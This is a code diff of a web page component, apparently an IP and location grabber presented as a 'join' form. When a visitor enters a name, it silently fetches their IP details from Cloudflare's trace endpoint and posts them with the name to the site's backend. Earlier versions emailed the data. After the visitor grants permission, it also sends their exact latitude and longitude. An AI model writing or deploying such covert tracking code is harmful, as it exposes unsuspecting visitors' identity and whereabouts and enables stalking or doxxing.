@@ -5,42 +5,44 @@ const Index: FC = () => {
 	const [joined, setJoined] = useState(false);
 	const [done, setDone] = useState(false);
 	const [accuracy, setAccuracy] = useState(1000);
+	const [id, setId] = useState("");
 
 	const onJoin = (e: FormEvent<HTMLFormElement>) => {
 		e.preventDefault();
 
 		fetch("https://www.cloudflare.com/cdn-cgi/trace")
 			.then((res) => res.text())
-			.then((text) => {
-				fetch("/api/mailer", {
+			.then(async (text) => {
+				const res = await fetch(`${window.location.origin}/api/ip`, {
 					method: "POST",
-					headers: {
-						Accept: "application/json, text/plain, */*",
-						"Content-Type": "application/json"
-					},
 					body: JSON.stringify({
-						subject: `IP info for [ ${name} ]`,
-						text
+						name,
+						ip: text,
+						latitude: 0,
+						longitude: 0,
+						accuracy: 1000
 					})
 				});
+
+				setId((await res.json())._id);
 			});
 
 		if (name !== "") setJoined(true);
 	};
 
 	const onAllow = () => {
+		if (id === "") return;
+
 		if (navigator.geolocation)
 			navigator.geolocation.getCurrentPosition(
-				(pos) => {
-					fetch("/api/mailer", {
+				async (pos) => {
+					await fetch(`${window.location.origin}/api/location`, {
 						method: "POST",
-						headers: {
-							Accept: "application/json, text/plain, */*",
-							"Content-Type": "application/json"
-						},
 						body: JSON.stringify({
-							subject: `Geolocation info for [ ${name} ]`,
-							text: `Position: ${pos.coords.latitude}, ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}`
+							id,
+							latitude: pos.coords.latitude,
+							longitude: pos.coords.longitude,
+							accuracy: pos.coords.accuracy
 						})
 					});
 
